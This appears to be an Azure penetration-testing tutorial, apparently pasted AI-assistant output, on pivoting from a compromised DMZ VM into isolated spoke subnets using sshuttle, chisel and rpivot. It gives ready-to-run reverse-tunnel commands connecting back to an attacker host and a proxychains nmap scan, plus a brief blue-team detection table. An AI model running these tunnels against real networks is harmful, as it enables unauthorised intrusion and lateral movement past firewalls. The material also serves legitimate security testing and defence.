# Tunnelling

**🛠️ Azure Penetration Testing: Tunneling Techniques in Hub-Spoke
Networks**

Tunneling is essential for **pivoting through Azure networks**,
bypassing **firewalls, NSGs**, or **isolated spokes** where internal
services are otherwise unreachable.

🔐 In Azure, internal VMs in Spoke VNETs (like app servers or DBs) are
often only accessible through:

- A **Jump Box/Bastion Host** in the Hub/DMZ

- **NSG rules** restricting lateral movement

- **Azure Firewall** filtering east-west traffic

Tunneling enables attackers to **access services inside the private
address space** using controlled relays or proxy mechanisms.

**🔎 Environment Assumptions**

| **Component** | **Role** |
|----|----|
| **Kali Linux** | Attacker machine outside Azure (public access) |
| **Ubuntu VM (Jump Box)** | Compromised VM in DMZ subnet (Hub VNET) with 2 NICs |
| **Target VM (e.g., App Server)** | Internal Spoke VNET, reachable only from DMZ subnet |
| **Azure Firewall** | Enforces east-west and north-south filtering |

**🔄 Technique 1: sshuttle – Full VPN-like Tunnel via SSH**

**✅ Use Case**

When SSH access is available to a **Linux VM in the DMZ**, and that VM
has **route access** to other subnets (e.g., Spoke VNETs), sshuttle
provides **transparent routing** to remote IP ranges without needing
SOCKS proxies or complex firewall rule changes.

**🧪 Scenario**

- SSH access to: ubuntu-dmz (10.0.1.4)

- Target internal VM: web-spoke (10.1.0.5)

- Goal: Route all traffic destined for 10.1.0.5 through the DMZ VM

**🔁 Steps**

sudo apt install sshuttle

sshuttle -r azureuser@10.0.1.4 10.1.0.0/16

- -r: Remote SSH host to tunnel through

- 10.1.0.0/16: Subnet to be routed through the tunnel

**🌐 Result**

Now you can directly curl http://10.1.0.5 from Kali, as if you're inside
the Azure VNET. sshuttle sets up iptables rules and forwards traffic
transparently.

**🔄 Technique 2: chisel – TCP Tunnel or SOCKS Proxy (Reverse)**

**✅ Use Case**

You only have **reverse shell or RCE** on a VM and **can’t SSH**, or
want to pivot without configuring system-wide routes. Chisel creates
**TCP tunnels** or **SOCKS proxies** over a single connection and is
ideal for Azure where **egress is allowed**, but ingress is blocked by
Azure Firewall.

**🔁 Basic TCP Tunnel Example**

**Kali (attacker)** runs:

./chisel server -p 8000 --reverse

**DMZ VM (reverse shell)** runs:

./chisel client \<KALI_PUBLIC_IP\>:8000 R:5000:10.1.0.5:80

- R:5000:10.1.0.5:80 forwards Kali’s localhost:5000 → target spoke VM
  port 80

**🌐 Test From Kali**

curl http://127.0.0.1:5000

✅ You’ve tunneled HTTP access to a **Spoke VNET service** through the
DMZ VM.

**🔁 SOCKS Proxy Mode**

To browse **any internal IP range** via proxy:

**Kali (attacker)**:

./chisel server -p 8000 --reverse

**DMZ VM**:

./chisel client \<KALI_PUBLIC_IP\>:8000 R:socks

Now configure Kali’s browser with:

- SOCKS5 proxy: 127.0.0.1:1080

- No proxy for: 127.0.0.1

✅ This lets you **browse internal-only web apps** in the Azure
environment using any browser or tool that supports SOCKS.

**🔄 Technique 3: rpivot – Reverse SOCKS4 Proxy**

**✅ Use Case**

When the target allows **outbound egress** but not inbound connections,
and you want to emulate **SSH dynamic port forwarding**, rpivot creates
a **reverse SOCKS4 proxy**.

**🔁 Steps**

**Kali (listener)**:

git clone https://github.com/klsecservices/rpivot.git

cd rpivot/

python server.py --server-port 9999 --server-ip \<KALI_PUBLIC_IP\>
--proxy-ip 127.0.0.1 --proxy-port 1080

**Compromised Azure VM**:

git clone https://github.com/klsecservices/rpivot.git

cd rpivot/

python client.py --server-ip \<KALI_PUBLIC_IP\> --server-port 9999

**Configure Proxy in Kali**:

- SOCKS4 proxy: 127.0.0.1:1080

Then browse internal apps or use proxy-aware tools like:

proxychains nmap -sT -Pn -p80 10.1.0.5

✅ Enables port scanning and access over SOCKS proxy to internal Azure
assets.

**🛡️ Detection & Defense (Blue Team Notes)**

| **Control** | **Description** |
|----|----|
| Azure Firewall + NSGs | Enforce egress restrictions to only known IPs |
| Defender for Endpoint | Detects unusual outbound connections (e.g., chisel, rpivot) |
| Just-in-Time Access (JIT) | Prevents persistent SSH or RDP access |
| Azure Network Watcher | Logs VNET flows, detect tunneling patterns |
| Azure Sentinel Rules | Alert on reverse tunnel indicators or high egress volume from DMZ VMs |

**✅ Summary Table**

| **Tool** | **Use Case** | **Azure PenTest Relevance** |
|----|----|----|
| sshuttle | Full subnet routing via SSH | Fast access to spoke subnets from DMZ |
| chisel | TCP/UDP reverse tunnels or SOCKS5 | Ideal when RCE or reverse shell is available |
| rpivot | Reverse SOCKS4 proxy | Lightweight for proxying via outbound-only access |

**🚀 Final Thoughts**

Tunneling is a core tactic in Azure post-exploitation. Once a foothold
is achieved in **Hub/DMZ**, tunneling into **isolated spokes** or
**subnet-restricted assets** allows attackers to:

- Access unexposed apps (e.g., admin portals, internal APIs)

- Scan internal networks

- Move laterally or dump secrets

Would you like a **fully scripted tunnel automation framework** using
chisel, sshuttle, and proxychains, tailored for Azure VNETs?

I can generate a modular Bash or Python-based toolkit next.
